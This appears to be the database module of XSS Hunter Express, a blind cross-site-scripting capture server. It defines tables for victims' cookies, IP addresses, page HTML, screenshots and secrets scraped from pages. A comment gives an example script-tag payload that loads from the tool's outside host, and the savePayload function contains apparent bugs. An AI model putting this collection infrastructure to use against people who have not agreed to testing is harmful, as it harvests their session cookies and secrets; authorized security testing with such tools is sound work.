const Sequelize = require('sequelize');
const uuid = require('uuid');

const get_secure_random_string = require('./utils.js').get_secure_random_string;
const get_hashed_password = require('./utils.js').get_hashed_password;
const constants = require('./constants.js');

const sequelize = new Sequelize(
	process.env.DATABASE_NAME,
	process.env.DATABASE_USER,
	process.env.DATABASE_PASSWORD,
	{
		host: process.env.DATABASE_HOST,
		dialect: 'postgres',
		benchmark: true,
		logging: true
	},
);

const Model = Sequelize.Model;

/*
	Storage for XSS Hunter Express settings.

	All settings keys must be unique.

	Additionally stores admin credentials for the 
	single user that can authenticate.
*/
class Settings extends Model {}
Settings.init({
	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},
	// Setting name
	key: {
		type: Sequelize.TEXT,
		allowNull: true,
		unique: true
	},
	// Setting value
	value: {
		type: Sequelize.TEXT,
		allowNull: true,
	},
}, {
	sequelize,
	modelName: 'settings',
	indexes: [
		{
			unique: true,
			fields: ['key'],
			method: 'BTREE',
		}
	]
});


/*
    Secrets found in DOMs
*/
class Secrets extends Model {}
Secrets.init({
 	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},   
    payload_id: {
        type: Sequelize.TEXT,
        allowNull: false,
        unique: false
    },
    secret_type: {
        type: sequelize.TEXT,
        allowNull: false,
        unique: false
    },
    secret_value: {
        type: sequelize.TEXT,
        allowNull: true,
        unique: false
    }
}, {
	sequelize,
	modelName: 'secrets',
	indexes: [
		{
			unique: false,
			fields: ['secret_type'],
			method: 'BTREE',
		},
        {
            unique: false,
            fields: ['secret_value'],
            method: 'BTREE'
        }
    ]
});
	
/*
	XSS payload fire results
*/
class PayloadFireResults extends Model {}
PayloadFireResults.init({
	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},
	// URL the XSS payload fired on.
	url: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// IP address of the user that
	// triggered the XSS payload fire.
	ip_address: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// The referer for the page the
	// XSS payload fired on.
	referer: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// User-Agent of the browser for
	// the user who triggered the XSS
	// payload fire.
	user_agent: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// Cookies of the user for the domain
	// the payload fired on.
	// Obviously, this excludes HTTPOnly
	cookies: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// Title of the page which the payload fired on.
	title: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// HTTP origin of the page (e.g.
	// https://example.com)
	origin: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// Random ID of the screenshot
	screenshot_id: {
		type: Sequelize.TEXT,
		allowNull: true,
		unique: false
	},
	// Whether the payload fired inside
	// of an iframe or not.
	was_iframe: {
		type: Sequelize.BOOLEAN,
		allowNull: false,
		unique: false
	},
	// Timestamp as reported by the
	// user's browser
	browser_timestamp: {
		type: Sequelize.BIGINT,
		allowNull: false,
		unique: false
	},
}, {
	sequelize,
	modelName: 'payload_fire_results',
	indexes: [
		{
			unique: false,
			fields: ['url'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['ip_address'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['referer'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['user_agent'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['cookies'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['title'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['origin'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['was_iframe'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['browser_timestamp'],
			method: 'BTREE',
		}
	]
});

let savePayload = async function(inbound_payload){
    let payload = await PayloadFireResults.create(inbound_payload);
    for (const secret of payload.secrets){
        secret.payload_id = payload.id;
        await Secret.create(payload);
    }
    return payload
}

class CollectedPages extends Model {}
CollectedPages.init({
	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},
	// URL of the collected page
	uri: {
		type: Sequelize.TEXT,
		allowNull: false,
	},
	// HTML response of page
	html: {
		type: Sequelize.TEXT,
		allowNull: true,
	},
}, {
	sequelize,
	modelName: 'collected_pages',
	indexes: [
		{
			unique: false,
			fields: ['uri'],
			method: 'BTREE',
		}
	]
});


class InjectionRequests extends Model {}
InjectionRequests.init({
	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},
	/*
		The full text of the request for a given
		injection attempt. For example, if you're
		doing an HTTP request with an XSS payload
		in a header, you'd include the full request.

		This isn't necessarily exclusive to HTTP. Any
		protocol can be used so long as it's converted
		to text and the information is sent to the API.

		(Must be text just so it can be displayed in
		the final XSS payload fire report).
	*/
	request: {
		type: Sequelize.TEXT,
		allowNull: false,
	},
	/*
		Each injection attempt has a unique shortkey
		which is used to correlate the attempt with
		the resulting XSS payload fire. By using this
		functionality you can always know what request
		you did which resulted in a given XSS payload fire.

		These unique shortkeys look like the following:

		<script src="https://xss.express/mwnba6k2"></script>

		In the above payload, "mwnba6k2" is the shortkey used
		to track injection attempts. In practice, users will
		utilize a tool which automatically generates these IDs
		and sends the injeciton request details to the API.
	*/
	injection_key: {
		type: Sequelize.TEXT,
		allowNull: false,
	},
}, {
	sequelize,
	modelName: 'injection_requests',
	indexes: [
		{
			unique: true,
			fields: ['injection_key'],
			method: 'BTREE',
		}
	]
});

async function initialize_configs() {
	// Check for existing session secret value
	const session_secret_setting = await Settings.findOne({
		where: {
			key: constants.session_secret_key
		}
	});

	// If it exists, there's nothing else to do here.
	if(session_secret_setting) {
		return
	}

	console.log(`No session secret set, generating one now...`);

	// Since it doesn't exist, generate one.
	await Settings.create({
		id: uuid.v4(),
		key: constants.session_secret_key,
		value: get_secure_random_string(64)
	});

	console.log(`Session secret generated successfully!`);
}

async function setup_admin_user(password) {
	// If there's an existing admin user, skip this.
	// Check for existing session secret value
	const admin_user_password = await Settings.findOne({
		where: {
			key: constants.ADMIN_PASSWORD_SETTINGS_KEY
		}
	});

	// If user is already set up then there's nothing
	// for us to do here, return.
	if(admin_user_password) {
		return false
	}

	const bcrypt_hash = await get_hashed_password(password);

	// Set up the admin user
	await Settings.create({
		id: uuid.v4(),
		key: constants.ADMIN_PASSWORD_SETTINGS_KEY,
		value: bcrypt_hash
	});

	return true;
}

function get_default_user_created_banner(password) {
	return `
============================================================================
 █████╗ ████████╗████████╗███████╗███╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝████╗  ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
███████║   ██║      ██║   █████╗  ██╔██╗ ██║   ██║   ██║██║   ██║██╔██╗ ██║
██╔══██║   ██║      ██║   ██╔══╝  ██║╚██╗██║   ██║   ██║██║   ██║██║╚██╗██║
██║  ██║   ██║      ██║   ███████╗██║ ╚████║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                           
vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
	An admin user (for the admin control panel) has been created
	with the following password:

	PASSWORD: ${password}

	XSS Hunter Express has only one user for the instance. Do not
	share this password with anyone who you don't trust. Save it
	in your password manager and don't change it to anything that
	is bruteforcable.

^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 █████╗ ████████╗████████╗███████╗███╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝████╗  ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
███████║   ██║      ██║   █████╗  ██╔██╗ ██║   ██║   ██║██║   ██║██╔██╗ ██║
██╔══██║   ██║      ██║   ██╔══╝  ██║╚██╗██║   ██║   ██║██║   ██║██║╚██╗██║
██║  ██║   ██║      ██║   ███████╗██║ ╚████║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                           
============================================================================
`;
}

async function initialize_users() {
	// Check if the admin user has been created.
	// If not then set it up.

	// Generate cryptographically-secure random
	// password for the default user we're adding.
	const new_password = get_secure_random_string(32);

	// Create user and add to database
	const new_user_created = await setup_admin_user(
		new_password
	);

	if(!new_user_created) {
		return
	}

	// Now we need to write these credentials to the
	// filesystem in a file so the user can retrieve
	// them.
	const banner_message = get_default_user_created_banner(
		new_password
	);

	console.log(banner_message);
}

// Set up correlation API with a randomly
// generated API key to auth with.
async function initialize_correlation_api() {
	const existing_correlation_key = await Settings.findOne({
		where: {
			key: constants.CORRELATION_API_SECRET_SETTINGS_KEY
		}
	});

	if(existing_correlation_key) {
		return
	}

	const api_key = get_secure_random_string(64);
	await Settings.create({
		id: uuid.v4(),
		key: constants.CORRELATION_API_SECRET_SETTINGS_KEY,
		value: api_key
	});
}

async function database_init() {
	const force = false;

	// Set up database schema
	await Promise.all([
		Settings.sync({ force: force }),
		PayloadFireResults.sync({ force: force }),
		CollectedPages.sync({ force: force }),
		InjectionRequests.sync({ force: force }),
	]);

	await Promise.all([
		// Set up configs if they're not already set up.
		initialize_configs(),

		// Set up admin panel user if not already set up.
		initialize_users(),

		// Set up the correlation API if not already set up
		initialize_correlation_api(),
	]);
}

async function update_settings_value(settings_key, new_value) {
	const settings_record = await Settings.findOne({
		where: {
			key: settings_key
		}
	});

	if(settings_record) {
		settings_record.value = new_value;
		await settings_record.save();
		return
	}

	await Settings.create({
		id: uuid.v4(),
		key: settings_key,
		value: new_value
	});
}

module.exports = {
	sequelize,
	Settings,
	PayloadFireResults,
	CollectedPages,
	InjectionRequests,
	database_init,
	update_settings_value
}
